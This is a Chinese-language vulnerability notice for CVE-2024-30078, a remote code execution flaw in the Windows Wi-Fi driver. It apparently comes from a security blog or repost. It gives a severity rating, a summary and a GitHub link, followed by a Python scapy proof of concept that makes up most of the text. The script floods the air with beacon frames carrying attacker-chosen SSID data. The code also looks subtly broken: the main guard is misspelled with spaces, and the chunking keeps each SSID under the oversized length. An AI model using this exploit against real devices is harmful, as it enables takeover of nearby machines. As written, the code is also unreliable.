# 漏洞名称:Windows WIFI驱动远程代码执行漏洞

# 漏洞编号:CVE-2024-30078

# 最近闹得沸沸扬扬的30078在今天也是公开了poc

# 危害程度:严重

# 危害等级:8.8

# 漏洞概述:Windows 系统中的一个严重缺陷允许系统在没有用户交互的情况下控制 Wi-Fi。该漏洞列为 CVE-2024-30078，允许范围内的攻击者设置恶意 Wi-Fi 网络并感染。漏洞存在于 Windows 的 Wi-Fi 驱动程序中，属于远程代码执行漏洞。攻击者只需在物理上接近受害者设备，即可通过 Wi-Fi 接管设备，无需与目标计算机建立物理连接，攻击者不需要任何特殊访问权限或其他特殊条件即可成功利用该漏洞

# GitHub:https://github.com/blkph0x/CVE_2024_30078_POC_WIFI

# POC:
from scapy.all import *
import sys

def create_wifi_packet(ssid):
    MAX_SSID_LENGTH = 255
    
    # Break the SSID into chunks of MAX_SSID_LENGTH
    ssid_chunks = [ssid[i:i+MAX_SSID_LENGTH] for i in range(0, len(ssid), MAX_SSID_LENGTH)]

    # Iterate through the SSID chunks and send a beacon frame for each chunk
    for index, chunk in enumerate(ssid_chunks):
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=f'01:00:00:00:01:{index:02x}', addr3=f'02:00:00:00:01:{index:02x}')
        beacon = Dot11Beacon()
        essid = Dot11Elt(ID='SSID', info=chunk, len=len(chunk))
        frame = RadioTap()/dot11/beacon/essid

        print(f"Sending Beacon frame with SSID chunk {index+1}/{len(ssid_chunks)} of length: {len(chunk)}")

        try:
            sendp(frame, iface='wlan0', count=100, inter=0.1, verbose=1)
        except PermissionError:
            print("Error: You need root privileges to send packets.")
            return
        except Exception as e:
            print(f"An error occurred: {e}")
            return

if _ _name_ _ == "_ _main_ _":
    if len(sys.argv) != 2:
        print("Usage: sudo python wifibeacon.py <SSID>")
        sys.exit(1)

    ssid = sys.argv[1]
    create_wifi_packet(ssid)